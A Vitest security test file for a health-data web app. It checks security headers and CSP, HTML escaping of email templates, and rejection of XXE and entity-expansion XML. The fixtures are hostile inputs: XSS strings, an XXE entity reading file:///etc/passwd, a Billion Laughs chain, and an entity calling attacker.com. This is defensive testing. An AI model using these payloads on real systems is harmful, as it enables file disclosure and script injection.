process.env.DATABASE_URL = process.env.DATABASE_URL || 'postgres://longevity:longevity_dev@localhost:5432/longevity';
process.env.SESSION_SECRET = process.env.SESSION_SECRET || 'test-session-secret-32-bytes-long!';

import { describe, it, expect, beforeAll } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { Readable } from 'node:stream';
import {
  escapeHtml,
  verifyEmailTemplate,
  passwordResetTemplate,
  insurerRequestReceivedTemplate,
  insurerInviteTemplate,
  weeklyReportTemplate,
} from '../lib/emailTemplates.js';
import { parseAppleHealthXml } from '../adapters/appleHealth.js';
import { parseFhirBundle } from '../adapters/fhir.js';

describe('Security Hardening & Helmet CSP / XXE (#104)', () => {
  let app: FastifyInstance;

  beforeAll(async () => {
    const { buildApp } = await import('../app.js');
    app = await buildApp();
  });

  describe('HTTP Security Headers & Content Security Policy (CSP)', () => {
    it('sets strict security headers on API responses', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/healthz',
      });

      expect(res.statusCode).toBe(200);

      // X-Frame-Options: DENY (Clickjacking protection)
      expect(res.headers['x-frame-options']).toBe('DENY');

      // X-Content-Type-Options: nosniff (MIME-Sniffing protection)
      expect(res.headers['x-content-type-options']).toBe('nosniff');

      // Referrer-Policy: strict-origin-when-cross-origin
      expect(res.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');

      // Permissions-Policy: camera=(), microphone=(), geolocation=()
      expect(res.headers['permissions-policy']).toBe('camera=(), microphone=(), geolocation=()');

      // Content-Security-Policy (CSP)
      const csp = res.headers['content-security-policy'] as string;
      expect(csp).toBeDefined();
      expect(csp).toContain("default-src 'self'");
      expect(csp).toContain("frame-ancestors 'none'");
      expect(csp).toContain("connect-src 'self'");
    });

    it('sets security headers on openapi endpoint', async () => {
      const res = await app.inject({
        method: 'GET',
        url: '/api/openapi.json',
      });

      expect(res.headers['x-frame-options']).toBe('DENY');
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      expect(res.headers['permissions-policy']).toBe('camera=(), microphone=(), geolocation=()');
    });
  });

  describe('HTML Email Template Escaping (XSS & Injection Protection)', () => {
    it('escapes dangerous HTML characters properly', () => {
      const payload = '<script>alert("xss")</script> & \'test\'';
      const escaped = escapeHtml(payload);
      expect(escaped).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt; &amp; &#39;test&#39;');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
      expect(escaped).not.toContain('"');
      expect(escaped).not.toContain("'");
    });

    it('escapes variables in verifyEmailTemplate', () => {
      const maliciousUrl = 'https://example.com/verify?token="><script>alert(1)</script>';
      const template = verifyEmailTemplate(maliciousUrl);
      expect(template.html).not.toContain('<script>');
      expect(template.html).toContain('&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it('escapes variables in passwordResetTemplate', () => {
      const maliciousUrl = 'https://example.com/reset?token=" onclick="alert(1)"';
      const template = passwordResetTemplate(maliciousUrl);
      expect(template.html).not.toContain('" onclick=');
      expect(template.html).toContain('&quot; onclick=&quot;alert(1)&quot;');
    });

    it('escapes variables in insurerRequestReceivedTemplate', () => {
      const maliciousCompany = 'Evil Corp <img src=x onerror=alert(1)>';
      const template = insurerRequestReceivedTemplate(maliciousCompany);
      expect(template.html).not.toContain('<img src=x');
      expect(template.html).toContain('&lt;img src=x onerror=alert(1)&gt;');
    });

    it('escapes variables in insurerInviteTemplate', () => {
      const maliciousOrg = 'AOK <script>steal()</script>';
      const maliciousUrl = 'https://example.com/invite"><script>bad()</script>';
      const template = insurerInviteTemplate(maliciousOrg, maliciousUrl);
      expect(template.html).not.toContain('<script>');
      expect(template.html).toContain('&lt;script&gt;steal()&lt;/script&gt;');
      expect(template.html).toContain('&quot;&gt;&lt;script&gt;bad()&lt;/script&gt;');
    });

    it('escapes variables in weeklyReportTemplate', () => {
      const template = weeklyReportTemplate({
        displayName: 'John <script>alert("name")</script>',
        score: 75.4,
        delta: 2.1,
        bestMetricLabel: 'VO2 Max <b>strong</b>',
        worstMetricLabel: 'Smoking <script>bad()</script>',
        streakDays: 14,
        dashboardUrl: 'https://example.com/dashboard"><script>bad()</script>',
      });
      expect(template.html).not.toContain('<script>');
      expect(template.html).not.toContain('<b>strong</b>');
      expect(template.html).toContain('&lt;b&gt;strong&lt;/b&gt;');
      expect(template.html).toContain('John &lt;script&gt;alert(&quot;name&quot;)&lt;/script&gt;');
    });
  });

  describe('XXE & XML Entity Expansion (Billion Laughs) Protection', () => {
    it('rejects Apple Health XML with external entities (XXE)', async () => {
      const maliciousXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE HealthData [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<HealthData locale="de_DE">
  <Record type="HKQuantityTypeIdentifierVO2Max" value="45" startDate="2026-09-01 08:00:00 +0200" endDate="2026-09-01 08:00:00 +0200"/>
</HealthData>`;

      const stream = Readable.from([maliciousXml]);
      await expect(parseAppleHealthXml(stream)).rejects.toThrow(/XXE|Entity/i);
    });

    it('rejects Apple Health XML with Billion Laughs entity expansion', async () => {
      const maliciousXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE HealthData [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<HealthData locale="de_DE">
  <Record type="HKQuantityTypeIdentifierVO2Max" value="45" startDate="2026-09-01 08:00:00 +0200" endDate="2026-09-01 08:00:00 +0200"/>
</HealthData>`;

      const stream = Readable.from([maliciousXml]);
      await expect(parseAppleHealthXml(stream)).rejects.toThrow(/XXE|Entity/i);
    });

    it('allows clean Apple Health XML without entity definitions', async () => {
      const cleanXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE HealthData [
]>
<HealthData locale="de_DE">
  <Record type="HKQuantityTypeIdentifierVO2Max" value="45" startDate="2026-09-01 08:00:00 +0200" endDate="2026-09-01 08:00:00 +0200"/>
</HealthData>`;

      const stream = Readable.from([cleanXml]);
      const samples = await parseAppleHealthXml(stream);
      expect(samples).toHaveLength(1);
      expect(samples[0].metric).toBe('vo2max');
      expect(samples[0].value).toBe(45);
    });

    it('rejects FHIR XML / string payload with XXE or DTD entities', () => {
      const maliciousFhir = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Bundle [
  <!ENTITY xxe SYSTEM "http://attacker.com/malicious">
]>
<Bundle xmlns="http://hl7.org/fhir">
</Bundle>`;

      expect(() => parseFhirBundle(maliciousFhir)).toThrow(/XXE|Entity/i);
    });
  });
});
